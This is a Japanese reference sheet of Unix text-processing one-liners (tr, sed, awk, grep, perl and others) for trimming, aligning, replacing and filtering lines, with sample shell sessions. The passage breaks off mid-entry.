ヒント 改行を切り落とす `tr -d \u0026lsquo;\\n\u0026rsquo; は頻度の高いコマンドです。 注意する点は \u0026lsquo;\\n\u0026rsquo; であって \u0026ldquo;\\n\u0026quot;ではありません。 対象は一文字なので、シングルクォートで囲む必要があります。 tr CRLF を LF 形式に変換します。 行末にCRLF形式の改行「\r」が入っているテキスト。\n「\r」は、Ctrl＋VとCtrl＋Mで入力できます。\nThis book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat CRLF.txt This book is suitable for classroom use as a general introduction to programming concepts.\rThis document is herewith granted to the Public Domain. No copyright!\rbash-3.2$ cat CRLF.txt | tr -d \u0026#39;\\r\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ ヒント 最近でもOSの違い、エディター間の解釈の違いから が行末についてしまうこともまれにあります。手作業で除去することもできるのですが、該当箇所が多くある場合は、`tr -d \u0026lsquo;\\r\u0026rsquo; で除去できることを覚えておくと良いです。 sed 先頭の空白とタブを削除 cat filename | sed -e \u0026#39;s/^[ \\t]*//\u0026#39; ヒント 先頭のタブだけを削除したい場合は、`sed -e \u0026rsquo;s/^[\\t]*//\u0026rsquo; となります。 awk 各行の終わりから末尾の空白 (スペース、タブ) を削除します。 This book is suitable for classroom use as a general introduction to programming concepts.[TAB] This document is herewith granted to the Public Domain. No copyright![TAB] bash-3.2$ cat ENDTAB.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat ENDTAB.txt | awk \u0026#39;{sub(/[ \\t]+$/,\u0026#34;\u0026#34;)};1\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ sed 各行から先頭と末尾の両方の空白を削除します。 This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat space.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat space.txt | sed \u0026#39;s/^[ \\t]*//;s/[ \\t]*$//\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ awk 各行から先頭と末尾の両方の空白を削除します。 This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat space.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat space.txt | awk \u0026#39;{gsub(/^[ \\t]+|[ \\t]+$/,\u0026#34;\u0026#34;)};1\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ awk 各行から先頭と末尾の両方の空白を削除します。 This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat space.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat space.txt | awk \u0026#39;{$1=$1};1\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ sed 各行の終わりから末尾の空白 (スペース、タブ) を削除します。 This book is suitable for classroom use as a general introduction to programming concepts.[TAB] This document is herewith granted to the Public Domain. No copyright![TAB] bash-3.2$ cat ENDTAB.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat ENDTAB.txt | sed \u0026#39;s/[ \\t]*$//\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ sed 各行の先頭に 5 つの空白を挿入します (ページ オフセットを作成します)。 This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt | sed -e \u0026#39;s/^/ /g\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ awk 各行の先頭に 5 つの空白を挿入します (ページ オフセットを作成します)。 This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt | awk \u0026#39;{sub(/^/,\u0026#34; \u0026#34;)};1\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ sed ２行間の改行を削除 currentLine nextLine $ cat newline.xt | sed \u0026#39;:a;N;$!ba;s/\\n//g\u0026#39; $ currentLinenextLine $ ヒント もちろん tr -d '\\n' でも同様のことができます。 水平位置の揃え方 sed 各行の先頭から先頭の空白 (スペース、タブ) を削除し、すべてのテキストを揃えて左揃えにします。 This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat TAB.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat TAB.txt | sed \u0026#39;s/^[ \\t]*//\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ awk 各行の先頭から先頭の空白 (スペース、タブ) を削除し、すべてのテキストを揃えて左揃えにします。 This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat TAB.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat TAB.txt | awk\u0026#39;{sub(/^[ \\t]+/,\u0026#34;\u0026#34;)};1\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ sed テキストを列幅79で右揃えにします。 This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt | sed -e :a -e \u0026#39;s/^.\\{1,78\\}$/ \u0026amp;/;ta\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ awk テキストを列幅79で右揃えにします。 This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt | awk \u0026#39;{printf \u0026#34;%79s\\n\u0026#34;,$0}\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ sed テキストを列幅79で中央揃えにします。 すべてのテキストを 79 列幅の中央に配置します。\nsed 方法１では、行頭のスペースが重要であり、後続のスペースは行末に追加されます。\nsed 方法２では、行の先頭にあるスペースは行の中央揃えで破棄され、行末に末尾のスペースは表示されません。\nThis book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! sed 方法１\nbash-3.2$ cat doc01.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt | sed -e :a -e \u0026#39;s/^.\\{1,77\\}$/ \u0026amp;/;ta\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ sed 方法２\nbash-3.2$ cat doc01.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt | sed -e :a -e \u0026#39;s/^.\\{1,77\\}$/ \u0026amp;/;ta\u0026#39; -e \u0026#39;s/\\( *\\)\\1/\\1/\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ awk テキストを列幅79で中央揃えにします。 This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt | awk \u0026#39;{l=length();s=int((79-l)/2);printf \u0026#34;%\u0026#34;(s+l)\u0026#34;s\\n\u0026#34;,$0}\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ 検索と置換 sed bazを含む行のfooをbarに置き換えます。 sed \u0026#39;/baz/s/foo/bar/g\u0026#39; このコマンドはわかりやすく分解すると、\nsed \u0026#39;/baz/\u0026#39; で、まずは baz を含む行を抽出します。\nその上で、\nsed \u0026#39;s/foo/bar/g\u0026#39; で、文字列 foo を bar に変換します。\nこの２つのsedコマンドをつなげると\nsed \u0026#39;/baz/s/foo/bar/g\u0026#39; となるわけです。\nヒント この組み合わせコマンドはsedの高速化に貢献します。 awk bazを含む行のfooをbarに置き換えます。 awk \u0026#39;/baz/{gsub(/foo/, \u0026#34;bar\u0026#34;)}; 1\u0026#39; sed bazを除く行のfooをbarに置き換えます。 sed \u0026#39;/baz/!s/foo/bar/g\u0026#39; ヒント `sed \u0026lsquo;/baz/!\u0026rsquo; が baz「以外」のという意味になります。 awk bazを除く行のfooをbarに置き換えます。 awk \u0026#39;!/baz/{gsub(/foo/, \u0026#34;bar\u0026#34;)}; 1\u0026#39; sed scarletまたはrubyまたはpuceをredに変更します。 sed \u0026#39;s/scarlet/red/g;s/ruby/red/g;s/puce/red/g\u0026#39; こちらは３つのsedコマンドが一つになった書き方です。\n多くの場合はこう書くことが多いです。\nsed -e \u0026#39;s/scarlet/red/g\u0026#39; -e \u0026#39;s/ruby/red/g\u0026#39; -e \u0026#39;s/puce/red/g\u0026#39; ヒント セミコロン ; で区切ることで一行で書くこともできるということです。 gsed scarletまたはrubyまたはpuceをredに変更します。 gsed \u0026#39;s/scarlet\\|ruby\\|puce/red/g\u0026#39; 多くの場合はこう書くことでしょう。\nsed -e \u0026#39;s/scarlet/red/g\u0026#39; -e \u0026#39;s/ruby/red/g\u0026#39; -e \u0026#39;s/puce/red/g\u0026#39; 一つ前の項目で、上記をさらに簡潔に書くことを紹介しました。\n;セミコロンで区切るのでしたね。\nsed \u0026#39;s/scarlet/red/g;s/ruby/red/g;s/puce/red/g\u0026#39; もっとわかりやすく書くこともできるわけです。\n\\ エスケープした上で |パイプで区切り、条件を複数列挙します。\ngsed \u0026#39;s/scarlet\\|ruby\\|puce/red/g\u0026#39; ヒント sed -e は 複数の sed を連続させるときに使うオプションですが、;セミコロンで区切り連続させることもできますし、\\|パイプで条件を区切り列挙することもできます。 見やすいと思う方法でプログラムを書けば良いと思います。 awk scarletまたはrubyまたはpuceをredに変更します。 awk \u0026#39;{gsub(/scarlet|ruby|puce/, \u0026#34;red\u0026#34;)}; 1\u0026#39; sed 文中の最初のfooだけをbarに置換 sed \u0026#39;s/foo/bar/\u0026#39; ヒント 「最初に見つかった」語句だけではなく、複数箇所の語句を置換したい場合は、グローバルオプションgをつけます。 sed \u0026rsquo;s/foo/bar/g\u0026rsquo; となります。 awk 文中の最初のfooだけをbarに置換 awk \u0026#39;{sub(/foo/,\u0026#34;bar\u0026#34;)}; 1\u0026#39; sed 文中の４つ目のfooだけをbarに置換 sed \u0026#39;s/foo/bar/4\u0026#39; awk 文中の４つ目のfooだけをbarに置換 gawk \u0026#39;{$0=gensub(/foo/,\u0026#34;bar\u0026#34;,4)}; 1\u0026#39; sed 文中のすべてのfooをbarに置換 sed \u0026#39;s/foo/bar/g\u0026#39; ヒント 「最初に見つかった」語句だけを置換したい場合は、グローバルオプションgをはずします。 sed \u0026rsquo;s/foo/bar/\u0026rsquo; となります。 awk 文中のすべてのfooをbarに置換 awk \u0026#39;{gsub(/foo/,\u0026#34;bar\u0026#34;)}; 1\u0026#39; sed 文中にある複数のfooの最後から二つ目のみをbarに置換 foo foo foo foo foo bash-3.2$ cat foobar.txt foo foo foo foo foo bash-3.2$ cat foobar.txt | sed \u0026#39;s/\\(.*\\)foo\\(.*foo\\)/\\1bar\\2/\u0026#39; foo foo foo bar foo bash-3.2$ sed 文中にある複数のfooの最後のfooだけをbarに置換 foo foo foo foo foo bash-3.2$ cat foobar.txt foo foo foo foo foo bash-3.2$ cat foobar.txt | sed \u0026#39;s/\\(.*\\)foo/\\1bar/\u0026#39; foo foo foo foo bar bash-3.2$ 行や段落の操作 tac 行の逆順（catの逆） This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt | tac This document is herewith granted to the Public Domain. No copyright! This book is suitable for classroom use as a general introduction to programming concepts. bash-3.2$ sed 行の逆順（catの逆） This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt | sed \u0026#39;1!G;h;$!d\u0026#39; This document is herewith granted to the Public Domain. No copyright! This book is suitable for classroom use as a general introduction to programming concepts. bash-3.2$ sed 行の逆順（catの逆） This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt | sed -n \u0026#39;1!G;h;$p\u0026#39; This document is herewith granted to the Public Domain. No copyright! This book is suitable for classroom use as a general introduction to programming concepts. bash-3.2$ awk 行の逆順（catの逆） This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt |awk \u0026#39;{a[i++]=$0} END {for (j=i-1; j\u0026gt;=0;) print a[j--] }\u0026#39; This document is herewith granted to the Public Domain. No copyright! This book is suitable for classroom use as a general introduction to programming concepts. bash-3.2$ perl 行の逆順（catの逆） This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt | perl -e \u0026#39;print reverse \u0026lt;\u0026gt;\u0026#39; This document is herewith granted to the Public Domain. No copyright! This book is suitable for classroom use as a general introduction to programming concepts. bash-3.2$ rev 行の各文字を反転します。 Hello, world. bash-3.2$ cat hello.txt Hello, world. bash-3.2$ cat hello.txt | rev .dlrow ,olleH bash-3.2$ sed 行の各文字を反転します。 Hello, world. bash-3.2$ cat hello.txt Hello, world. bash-3.2$ cat hello.txt | sed \u0026#39;/\\n/!G;s/\\(.\\)\\(.*\\n\\)/\u0026amp;\\2\\1/;//D;s/.//\u0026#39; .dlrow ,olleH bash-3.2$ perl 行の各文字を反転します。 Hello, world. bash-3.2$ cat hello.txt Hello, world. bash-3.2$ cat hello.txt | sed \u0026#39;/\\n/!G;s/\\(.\\)\\(.*\\n\\)/\u0026amp;\\2\\1/;//D;s/.//\u0026#39; .dlrow ,olleH bash-3.2$ cat hello.txt | perl -nle \u0026#39;print scalar reverse $_\u0026#39; .dlrow ,olleH bash-3.2$ sed 行を水平方向に結合 Hello, world. Welcome to Japan. bash-3.2$ cat hello03.txt Hello, world. Welcome to Japan. bash-3.2$ cat hello03.txt | sed \u0026#39;$!N;s/\\n/ /\u0026#39; Hello, world. Welcome to Japan. bash-3.2$ gsed 5行ごとに空白行を追加(5、10、15、20 行などの後) Advanced Bash-Scripting Guide An in-depth exploration of the art of shell scripting Mendel Cooper \u0026lt;thegrendel.abs@gmail.com\u0026gt; 10 10 Mar 2014 Revision History Revision 6.5 05 Apr 2012 Revised by: mc \u0026#39;TUNGSTENBERRY\u0026#39; release Revision 6.6 27 Nov 2012 Revised by: mc \u0026#39;YTTERBIUMBERRY\u0026#39; release Revision 10 10 Mar 2014 Revised by: mc \u0026#39;PUBLICDOMAIN\u0026#39; release This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX(Q)* wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts. This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc04.txt | gsed \u0026#39;0~5G\u0026#39; Advanced Bash-Scripting Guide An in-depth exploration of the art of shell scripting Mendel Cooper \u0026lt;thegrendel.abs@gmail.com\u0026gt; 10 10 Mar 2014 Revision History Revision 6.5 05 Apr 2012 Revised by: mc \u0026#39;TUNGSTENBERRY\u0026#39; release Revision 6.6 27 Nov 2012 Revised by: mc \u0026#39;YTTERBIUMBERRY\u0026#39; release Revision 10 10 Mar 2014 Revised by: mc \u0026#39;PUBLICDOMAIN\u0026#39; release This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX(Q)* wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts. This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ sed 5行ごとに空白行を追加(5、10、15、20 行などの後) Advanced Bash-Scripting Guide An in-depth exploration of the art of shell scripting Mendel Cooper \u0026lt;thegrendel.abs@gmail.com\u0026gt; 10 10 Mar 2014 Revision History Revision 6.5 05 Apr 2012 Revised by: mc \u0026#39;TUNGSTENBERRY\u0026#39; release Revision 6.6 27 Nov 2012 Revised by: mc \u0026#39;YTTERBIUMBERRY\u0026#39; release Revision 10 10 Mar 2014 Revised by: mc \u0026#39;PUBLICDOMAIN\u0026#39; release This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX(Q)* wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts. This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc04.txt | sed \u0026#39;n;n;n;n;G;\u0026#39; Advanced Bash-Scripting Guide An in-depth exploration of the art of shell scripting Mendel Cooper \u0026lt;thegrendel.abs@gmail.com\u0026gt; 10 10 Mar 2014 Revision History Revision 6.5 05 Apr 2012 Revised by: mc \u0026#39;TUNGSTENBERRY\u0026#39; release Revision 6.6 27 Nov 2012 Revised by: mc \u0026#39;YTTERBIUMBERRY\u0026#39; release Revision 10 10 Mar 2014 Revised by: mc \u0026#39;PUBLICDOMAIN\u0026#39; release This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX(Q)* wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts. This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ ファイル操作 rename すべてのファイルの名前を変更します (たとえば、すべての .gz ファイルから ABC を削除します)。\nrename \u0026#39;s/ABC//\u0026#39; *.gz rename すべてのファイルにファイル拡張子を追加します (例: .txt を追加) rename s/$/.txt/ * paste ファイルの行を並べて結合 Hello, world. Welcome to Japan. bash-3.2$ cat hello.txt Hello, world. bash-3.2$ cat hello02.txt Welcome to Japan. bash-3.2$ paste hello.txt hello02.txt Hello, world. Welcome to Japan. bash-3.2$ ヒント pasteコマンドは複数のファイルを横に並べて結合します。 paste 2つ以上のファイルを列に結合/貼り付けます (例: fileA、fileB、fileC) paste fileA fileB fileC perl 各ファイル名の文字列の名前の部分aaaをbbbに変更します。 ls | perl -ne \u0026#39;chomp; next unless -e; $o = $_; s/aaa/bbb/; next if -e; rename $o, $_\u0026#39;; 条件出力 head sed awk 最初の 10 行を出力 head head -n10 sed 10q awk \u0026#39;NR \u0026lt; 11\u0026#39; 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ awk 文字列を含む行出力しない (例: \u0026lsquo;bbo\u0026rsquo;) cat file | awk \u0026#39;!/bbo/\u0026#39; head sed awk 最初の行を出力 head -1 sed q awk \u0026#39;NR\u0026gt;1{exit};1\u0026#39; 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ tail sed 最後の 10 行を出力 tail tail -n10 sed -e :a -e \u0026#39;$q;N;11,$D;ba\u0026#39; tail sed awk 最後の 2 行を出力 tail -2 sed \u0026#39;$!N;$!D\u0026#39; awk \u0026#39;{y=x \u0026#34;\\n\u0026#34; $0; x=$0};END{print y}\u0026#39; tail sed awk 最後の行を出力 tail -1 sed \u0026#39;$!d\u0026#39; sed -n \u0026#39;$p\u0026#39; awk \u0026#39;END{print}\u0026#39; sed 最終行の次の行を出力 sed -e \u0026#39;$!{h;d;}\u0026#39; -e x # for 1-line, print blank line sed -e \u0026#39;1{$q;}\u0026#39; -e \u0026#39;$!{h;d;}\u0026#39; -e x # for 1-line, print the line sed -e \u0026#39;1{$d;}\u0026#39; -e \u0026#39;$!{h;d;}\u0026#39; -e x # for 1-line, print nothing sed 最後に列を追加 for i in $(ls);do sed -i \u0026#34;s/$/\\t$i/\u0026#34; $i;done 条件検索・正規表現 grep sed awk 正規表現に一致する行のみを出力 grep \u0026#39;regex\u0026#39; sed -n \u0026#39;/regex/p\u0026#39; # method 1 sed \u0026#39;/regex/!d\u0026#39; # method 2 awk \u0026#39;/regex/\u0026#39; grep sed awk 正規表現に一致しない行のみを出力: grep -v regex sed -n \u0026#39;/regex/!p\u0026#39; # method 1, corresponds to above sed \u0026#39;/regex/d\u0026#39; # method 2, simpler syntax awk \u0026#39;!/regex/\u0026#39; ヒント grep -v は基本です。 grep 空行をカウントする cat filename.txt | grep -c \u0026#34;^$\u0026#34; または、\ncat filename.txt | grep \u0026#34;^$\u0026#34; | wc -l ヒント wc -lは、行数をカウントするwcコマンドです。 ^$の ^ は行頭、 $は行末、いわゆる行頭と行末の間になにもない、それは空白行と意味します。 空白行をwc -lでカウントするということになります。 grep 単語とマッチしない行を表示 (例: \u0026lsquo;bbo\u0026rsquo;) cat filename.txt | grep -v bbo ヒント -vは、「ではない（マッチしない）」という意味になります。 grep 一致する行番号を返す 検索文字列は(例: \u0026lsquo;bbo\u0026rsquo;) cat filename.txt | grep -c bbo grep 特定の文字列で始まらない行を表示 (例: #) cat filename.txt | grep -v \u0026#39;^#\u0026#39; ヒント ^は行頭という意味です。 grep 大文字と小文字を区別しない grep (例: \u0026lsquo;bbo\u0026rsquo;/\u0026lsquo;BBO\u0026rsquo;/\u0026lsquo;Bbo\u0026rsquo;) cat filename.txt | grep -i \u0026#34;bbo\u0026#34; ヒント こちらのオプションもよく使われます。 grep マッチに色を付けます (例: \u0026lsquo;bbo\u0026rsquo;)! cat filename.txt | grep --color bbo 以下の2行を ~/.bashrc に追記して保存しておくと常にgrepコマンドがカラー表示となります。\nalias grep=\u0026#39;grep --color=auto\u0026#39; alias egrep=\u0026#39;egrep --color=auto\u0026#39; alias fgrep=\u0026#39;fgrep --color=auto\u0026#39; alias ls=\u0026#39;ls -FG\u0026#39;; sed 特定の行を出力 (例: 123 行目) sed -n -e \u0026#39;123p\u0026#39; sed 行数を出力します (例: 10 行目から 33 行目) cat filename | sed -n \u0026#39;10,33p\u0026#39; sed n行ごとに出力する cat filename | sed -n \u0026#39;0~3p\u0026#39; sed 奇数行ごとに出力 cat filename | sed -n \u0026#39;1~2p\u0026#39; sed 最初の行を含めて 3 行ごとに出力する cat filename | sed -n \u0026#39;1p;0~3p\u0026#39; sed awk 正規表現の直前の行を出力 正規表現を含む行は出力しません:\nsed -n \u0026#39;/regex/{g;1!p;};h\u0026#39; awk \u0026#39;/regex/{print x};{x=$0}\u0026#39; awk \u0026#39;/regex/{print (NR==1 ? \u0026#34;match on line 1\u0026#34; : x)};{x=$0}\u0026#39; 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ sed awk 正規表現の直後の行を出力 正規表現を含む行は出力しません:\nsed -n \u0026#39;/regex/{n;p;}\u0026#39; awk \u0026#39;/regex/{getline;print}\u0026#39; grep sed 正規表現の前後１行のコンテキストを行番号付きで出力 grep -A1 -B1 -n regex sed -n -e \u0026#39;/regex/{=;x;1!p;g;$!N;p;D;}\u0026#39; -e h sed awk AAA と BBB と CCC を検索します (任意の順序で): sed \u0026#39;/AAA/!d; /BBB/!d; /CCC/!d\u0026#39; awk \u0026#39;/AAA/ \u0026amp;\u0026amp; /BBB/ \u0026amp;\u0026amp; /CCC/\u0026#39; sed awk AAA、BBB、CCC(この順序で)を含む行を検索します。 sed \u0026#39;/AAA.*BBB.*CCC/!d\u0026#39; awk \u0026#39;/AAA.*BBB.*CCC/\u0026#39; egrep grep sed AAA、BBBまたはCCCを検索します。 egrep \u0026#34;AAA|BBB|CCC\u0026#34; grep -E \u0026#34;AAA|BBB|CCC\u0026#34; sed -e \u0026#39;/AAA/b\u0026#39; -e \u0026#39;/BBB/b\u0026#39; -e \u0026#39;/CCC/b\u0026#39; -e d # most seds gsed \u0026#39;/AAA\\|BBB\\|CCC/!d\u0026#39; # GNU sed only sed AAAが含まれている段落を出力 (空白行で段落を区切ります):\nsed -e \u0026#39;/./{H;$!d;}\u0026#39; -e \u0026#39;x;/AAA/!d;\u0026#39; sed 段落AAAに BBBとCCC(任意の順序で)が含まれている段落を出力 sed -e \u0026#39;/./{H;$!d;}\u0026#39; -e \u0026#39;x;/AAA/!d;/BBB/!d;/CCC/!d\u0026#39; sed gsed AAA、BBBまたはCCCが含まれている段落を出力 sed -e \u0026#39;/./{H;$!d;}\u0026#39; -e \u0026#39;x;/AAA/b\u0026#39; -e \u0026#39;/BBB/b\u0026#39; -e \u0026#39;/CCC/b\u0026#39; -e d gsed \u0026#39;/./{H;$!d;};x;/AAA\\|BBB\\|CCC/b;d\u0026#39; sed awk 65 文字以上の行を出力 sed -n \u0026#39;/^.\\{65\\}/p\u0026#39; awk \u0026#39;length \u0026gt; 64\u0026#39; sed awk 65 文字未満の行のみを出力 sed -n \u0026#39;/^.\\{65\\}/!p\u0026#39; # method 1, corresponds to above sed \u0026#39;/^.\\{65\\}/d\u0026#39; # method 2, simpler syntax awk \u0026#39;length \u0026lt; 65\u0026#39; sed awk 正規表現から最後までのセクションを出力 sed -n \u0026#39;/regex/,$p\u0026#39; awk \u0026#39;/regex/,0\u0026#39; awk \u0026#39;/regex/,EOF\u0026#39; sed awk perl 行番号に基づいてセクションを出力 (8 行目から 12 行目まで):\nsed -n \u0026#39;8,12p\u0026#39; sed \u0026#39;8,12!d\u0026#39; awk \u0026#39;NR==8,NR==12\u0026#39; perl -ne \u0026#39;print if 8 .. 12\u0026#39; perl -pe \u0026#39;exit if 8\u0026lt;$. \u0026amp;\u0026amp; $.\u0026lt;12\u0026#39; 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ sed awk 行番号 52 を出力 sed -n \u0026#39;52p\u0026#39; sed \u0026#39;52!d\u0026#39; sed \u0026#39;52q;d\u0026#39; awk \u0026#39;NR==52\u0026#39; awk \u0026#39;NR==52 {print;exit}\u0026#39; 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ gsed sed ３行目から ７行ごとに出力 gsed -n \u0026#39;3~7p\u0026#39; sed -n \u0026#39;3,${p;n;n;n;n;n;n;}\u0026#39; sed awk perl 2 つの正規表現の間のセクションを出力 sed -n \u0026#39;/START/,/END/p\u0026#39; awk \u0026#39;/START/,/END/\u0026#39; perl -ne \u0026#39;print if /START/ .. /END/\u0026#39; perl -ne \u0026#39;print if m{START} .. m{END}\u0026#39; sed perl 2 つの正規表現の間のセクションを除くすべてを出力 sed \u0026#39;/START/,/END/d\u0026#39; perl -i.old -ne \u0026#39;print unless /START/ .. /END/\u0026#39; awk 列を正規表現と照合 awk \u0026#39;$7 ~ /^[a-f]/\u0026#39; awk \u0026#39;$7 !~ /^[a-f]/\u0026#39; awk ５番目の列が条件にあっていれば出力 awk \u0026#39;$5 == \u0026#34;abc123\u0026#34;\u0026#39; awk ５番目の列が条件にあっていなければ出力 awk \u0026#39;$5 != 